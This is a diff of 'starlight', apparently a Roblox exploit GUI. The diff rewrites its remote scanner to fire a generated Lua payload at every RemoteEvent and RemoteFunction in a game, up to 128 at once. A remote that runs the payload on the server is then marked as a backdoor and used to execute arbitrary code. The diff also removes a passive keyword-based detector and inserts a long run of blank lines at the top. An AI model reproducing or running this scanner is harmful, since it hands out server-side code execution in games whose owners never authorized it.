@@ -1,6 +1,246 @@
 -- starlight 💫
--- 0.2.9
-print("made by lolbad with ❤️")
+-- 0.2.6
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 -- Instances:
 local Converted = {
@@ -995,7 +1235,7 @@ Converted["_UIStroke21"].Thickness = 1.5
 Converted["_UIStroke21"].Parent = Converted["_ToggleMode"]
 
 Converted["_Version"].Font = Enum.Font.SourceSans
-Converted["_Version"].Text = "Version: 0.2.8"
+Converted["_Version"].Text = "Version: 0.2.6"
 Converted["_Version"].TextColor3 = Color3.fromRGB(255, 255, 255)
 Converted["_Version"].TextScaled = true
 Converted["_Version"].TextSize = 14
@@ -2513,154 +2753,143 @@ local function ZXOSLR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.L
 	local FinishedFound = false
 	local scannedRemotes = {}
 	
-	-- === Starlight Backend Bugfix Update ===
-	-- Strict mode: set to true to flag everything not explicitly whitelisted
-	local STRICT_MODE = true -- now default to true for aggressive detection
-	local safeRemoteNames = {
-		-- Add known safe remotes here if needed
-	}
 	local function isLikelyBackdoorRemote(remote)
-		-- Always flag if not in safe list or has suspicious name/context/location
-		if not safeRemoteNames[remote.Name] then return true end
-		return false
+		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
+		if EXCLUDED_REMOTES[remote.Name] then return false end
+	
+		return true
 	end
-
-	-- List of suspicious remote names (lowercase, with more obfuscation patterns)
-	local suspiciousNames = {
-		"remotespy", "backdoor", "script", "scr1pt", "scrlpt", "ex3cute", "execute", "admin", "bypass", "server", "client", "control", "cmd", "command", "run", "exploit", "rem0te", "rem0t3", "ex3c", "h4x", "hax", "hack", "inject", "payload", "remoteevent", "remotefunction"
-	}
-
-	-- Helper: check if a string is suspicious
-	local function isSuspiciousName(name)
-		name = name:lower()
-		for _, sus in ipairs(suspiciousNames) do
-			if name:find(sus) then return true end
-		end
-		-- Obfuscation: non-ascii or very long
-		if #name > 25 or name:find("[^%w_]", 1) then return true end
-		return false
-	end
-
-	-- Helper: check context (parent, grandparent, children)
-	local function isSuspiciousContext(remote)
-		local parent = remote.Parent
-		if parent and isSuspiciousName(parent.Name) then return true end
-		if parent and parent.Parent and isSuspiciousName(parent.Parent.Name) then return true end
-		-- Check children
-		for _, child in ipairs(remote:GetChildren()) do
-			if isSuspiciousName(child.Name) then return true end
-		end
-		return false
-	end
-
-	-- Helper: check if remote is in a weird location
-	local function isWeirdLocation(remote)
-		local parent = remote.Parent
-		if not parent then return true end
-		local allowed = {
-			["ReplicatedStorage"] = true,
-			["Workspace"] = true,
-			["Players"] = true,
-			["StarterGui"] = true,
-			["StarterPack"] = true,
-			["StarterPlayer"] = true,
-			["ServerScriptService"] = true,
-		}
-		if not allowed[parent.Name] then return true end
-		return false
-	end
-
-	-- Improved detection function for backdoor remotes
-	local function isLikelyBackdoorRemote(remote)
-		if isSuspiciousName(remote.Name) then return true end
-		if isSuspiciousContext(remote) then return true end
-		if isWeirdLocation(remote) then return true end
-		return false
-	end
-
-	-- Add logging for every remote checked
-	local function logRemoteCheck(remote, result)
-		if result then
-			print("[starlight] Suspicious remote detected: " .. remote:GetFullName())
-		else
-			print("[starlight] Remote checked and considered safe: " .. remote:GetFullName())
-		end
-	end
-
-	-- Deep scan all descendants, including SSS if accessible
-	local function getAllRemotesDeep()
-		local remotes = {}
-		local function scan(obj)
-			for _, child in ipairs(obj:GetChildren()) do
-				if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-					table.insert(remotes, child)
-				end
-				scan(child)
-			end
-		end
-		scan(game)
-		-- Try SSS if accessible
-		pcall(function()
-			local sss = game:FindService("ServerScriptService")
-			if sss then scan(sss) end
-		end)
-		return remotes
-	end
-
-	local foundExploit = false
-	local remoteEvent, remoteFunction
-	local FinishedFound = false
-	local scannedRemotes = {}
-	local suspiciousRemotes = {}
-
+	
 	local function testRemote(remote, isFunction, timeout)
 		if foundExploit or scannedRemotes[remote] then return false end
-		
 		scannedRemotes[remote] = true
 		if not isLikelyBackdoorRemote(remote) then return false end
-		table.insert(suspiciousRemotes, remote)
-		-- Optionally, try to trigger the remote (commented for safety)
-		-- ... existing code ...
+	
+		local modelName = "starlight_"..tostring(math.random(1,999999))
+		local foundEvent = false
+	
+		local connection = rs.DescendantAdded:Connect(function(inst)
+			if inst.Name == modelName then
+				foundEvent = true
+			end
+		end)
+	
+		local function cleanup()
+			connection:Disconnect()
+			local f = rs:FindFirstChild(modelName)
+			if f then f:Destroy() end
+		end
+	
+		local payload = [[
+			local m=Instance.new("ObjectValue")
+			m.Name="]]..modelName..[["
+			m.Parent=game:GetService("ReplicatedStorage")
+		]]
+	
+		local finished = false
+	
+		task.spawn(function()
+			pcall(function()
+				if isFunction then
+					remote:InvokeServer(payload .. "\nreturn true")
+				else
+					remote:FireServer(payload)
+				end
+			end)
+			finished = true
+		end)
+	
+		local start = os.clock()
+		while os.clock() - start < timeout do
+			if foundEvent or rs:FindFirstChild(modelName) then
+				foundEvent = true
+				break
+			end
+			if finished then break end
+			task.wait()
+		end
+	
+		cleanup()
+	
+		if foundEvent and not foundExploit then
+			foundExploit = true
+			if isFunction then
+				remoteFunction = remote
+			else
+				remoteEvent = remote
+			end
+			return true
+		end
+	
 		return false
 	end
-
+	
 	local function fastFindRemote(timeout)
 		foundExploit = false
 		remoteEvent = nil
 		remoteFunction = nil
 		scannedRemotes = {}
-		suspiciousRemotes = {}
-
-		local remotes = getAllRemotesDeep()
-		print(string.format("💫 starlight: 🔍 deep scanning %d remotes", #remotes))
+	
+		local remotes = {}
+		for _, remote in ipairs(game:GetDescendants()) do
+			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+				table.insert(remotes, remote)
+			end
+		end
+	
+		print(string.format("💫 starlight: 🔍 scanning %d remotes", #remotes))
+	
 		table.sort(remotes, function(a, b)
+			-- sort: sus name/loc first
 			local aScore = isLikelyBackdoorRemote(a) and 1 or 0
 			local bScore = isLikelyBackdoorRemote(b) and 1 or 0
 			return aScore > bScore
 		end)
+	
+		local MAX_CONCURRENT = 128
+		local activeTasks = 0
+		local taskDone = Instance.new("BindableEvent")
+	
 		for i = 1, #remotes do
-			if testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout) then
-				-- Set the first found as the backdoor
-				if remotes[i]:IsA("RemoteEvent") then
-					remoteEvent = remotes[i]
-				elseif remotes[i]:IsA("RemoteFunction") then
-					remoteFunction = remotes[i]
-				end
-				foundExploit = true
-				print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
-				break
+			if foundExploit then break end
+	
+			while activeTasks >= MAX_CONCURRENT do
+				taskDone.Event:Wait()
 			end
+	
+			activeTasks += 1
+			task.spawn(function()
+				local ok, result = pcall(function()
+					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
+				end)
+	
+				if ok and result then
+					print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
+				end
+	
+				activeTasks -= 1
+				taskDone:Fire()
+			end)
 		end
+	
+		while activeTasks > 0 and not foundExploit do
+			taskDone.Event:Wait()
+		end
+	
 		if not foundExploit then
 			print("💫 starlight: backdoor not found")
 		end
+	
 		return foundExploit
 	end
-
+	
 	local function findRemote()
 		local trueStart = os.clock()
 		local tStart = os.clock()
-		fastFindRemote(0.1)
+	
+		fastFindRemote(1)
+	
 		scanTime = os.clock() - trueStart
 		FinishedFound = true
 		print(string.format("💫 starlight: scan completed in %.3f seconds", os.clock() - tStart))
@@ -2688,18 +2917,8 @@ local function ZXOSLR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.L
 				showNotification("starlight 💫", "❌ failed to run script!", 3)
 			end
 		else
-			-- Try to run locally (for Studio/exploit testing)
-			local f, err = loadstring(code)
-			if f then
-				local success, execErr = pcall(f)
-				if success then
-					showNotification("starlight 💫", "✅ successfully ran script locally!", 1)
-				else
-					showNotification("starlight 💫", "❌ error running script: " .. tostring(execErr), 3)
-				end
-			else
-				showNotification("starlight 💫", "❌ loadstring error: " .. tostring(err), 3)
-			end
+			warn("💫 starlight: no backdoor, cannot execute code.")
+			showNotification("starlight 💫", "no backdoor found, or you didn't scan - can't run code.", 3)
 		end
 	end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
@@ -2825,32 +3044,15 @@ local function ZXOSLR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.L
 	script.Parent.Logs.BG.MouseButton1Click:Connect(function()
 		if bg == 1 then
 			bg = 2
-			script.Parent.Logs.BG.Text = "Background: Modern"
 			script.Parent.bg.Visible = true
-		elseif bg == 2 then
-			bg = 3
-			script.Parent.Logs.BG.Text = "Background: Pure Pain"
-			script.Parent.bg.Visible = false
-			-- Create function for Pure Pain theme
-			local function applyPurePainTheme()
-				for _, obj in pairs(Converted) do
-					if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("TextLabel") or obj:IsA("TextBox") then
-						obj.BackgroundColor3 = Color3.fromRGB(255,255,255)
-						if obj:IsA("TextButton") or obj:IsA("TextLabel") or obj:IsA("TextBox") then
-							obj.TextColor3 = Color3.fromRGB(0,0,0)
-						end
-					end
-					if obj:IsA("UIStroke") then
-						obj.Color = Color3.fromRGB(255,0,0)
-					end
-				end
-			end
-			applyPurePainTheme()
-		elseif bg == 3 then
+			script.Parent.Logs.BG.Text = "Background: Modern"
+			return
+		end
+		if bg == 2 then
 			bg = 1
-			script.Parent.Logs.BG.Text = "Background: Static"
 			script.Parent.bg.Visible = false
-			-- Restore original theme (will happen automatically when switching back)
+			script.Parent.Logs.BG.Text = "Background: Static"
+			return
 		end
 	end)
 	local scanning = false
@@ -2980,75 +3182,6 @@ local function IEZZYTQ_fake_script() -- Fake Script: StarterGui.Starlight.str.Lo
 		button.UIStroke.Color = Color3.fromRGB(57,57,57)
 	end)
 end
-
--- Add 'Surprise' button to sidebar
-local surpriseButton = Instance.new("TextButton")
-surpriseButton.Name = "Surprise"
-surpriseButton.Text = "Surprise"
-surpriseButton.Font = Enum.Font.SourceSans
-surpriseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-surpriseButton.TextSize = 14
-surpriseButton.AutoButtonColor = false
-surpriseButton.BackgroundColor3 = Color3.fromRGB(16,16,16)
-surpriseButton.BorderColor3 = Color3.fromRGB(0,0,0)
-surpriseButton.BorderSizePixel = 0
-surpriseButton.Position = UDim2.new(0.142, 0, 0.85, 0)
-surpriseButton.Size = UDim2.new(0, 42, 0, 42)
-surpriseButton.Parent = Converted["_Sidebar"]
-local surpriseUICorner = Instance.new("UICorner")
-surpriseUICorner.CornerRadius = UDim.new(0, 6)
-surpriseUICorner.Parent = surpriseButton
-local surpriseUIStroke = Instance.new("UIStroke")
-surpriseUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-surpriseUIStroke.Color = Color3.fromRGB(57,57,57)
-surpriseUIStroke.Thickness = 1.5
-surpriseUIStroke.Parent = surpriseButton
-surpriseButton.MouseButton1Click:Connect(function()
-    game.StarterGui:SetCore("SendNotification",{
-        Title = "💫 starlight",
-        Text = "You found the surprise!",
-        Duration = 5
-    })
-end)
-
--- Remove the 'Pure Pain' button that was previously added
-if Converted["_Logs"]:FindFirstChild("PurePain") then
-    Converted["_Logs"].PurePain:Destroy()
-end
-
--- Create function for Pure Pain theme
-local function applyPurePainTheme()
-    for _, obj in pairs(Converted) do
-        if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("TextLabel") or obj:IsA("TextBox") then
-            obj.BackgroundColor3 = Color3.fromRGB(255,255,255)
-            if obj:IsA("TextButton") or obj:IsA("TextLabel") or obj:IsA("TextBox") then
-                obj.TextColor3 = Color3.fromRGB(0,0,0)
-            end
-        end
-        if obj:IsA("UIStroke") then
-            obj.Color = Color3.fromRGB(255,0,0)
-        end
-    end
-end
-
--- Replace the BG button click handler with one that cycles through 3 modes
-script.Parent.Logs.BG.MouseButton1Click:Connect(function()
-    if bg == 1 then
-        bg = 2
-        script.Parent.Logs.BG.Text = "Background: Modern"
-        script.Parent.bg.Visible = true
-    elseif bg == 2 then
-        bg = 3
-        script.Parent.Logs.BG.Text = "Background: Pure Pain"
-        script.Parent.bg.Visible = false
-        applyPurePainTheme()
-    elseif bg == 3 then
-        bg = 1
-        script.Parent.Logs.BG.Text = "Background: Static"
-        script.Parent.bg.Visible = false
-        -- Restore original theme (will happen automatically when switching back)
-    end
-end)
 
 coroutine.wrap(OANEA_fake_script)()
 coroutine.wrap(KKMF_fake_script)()
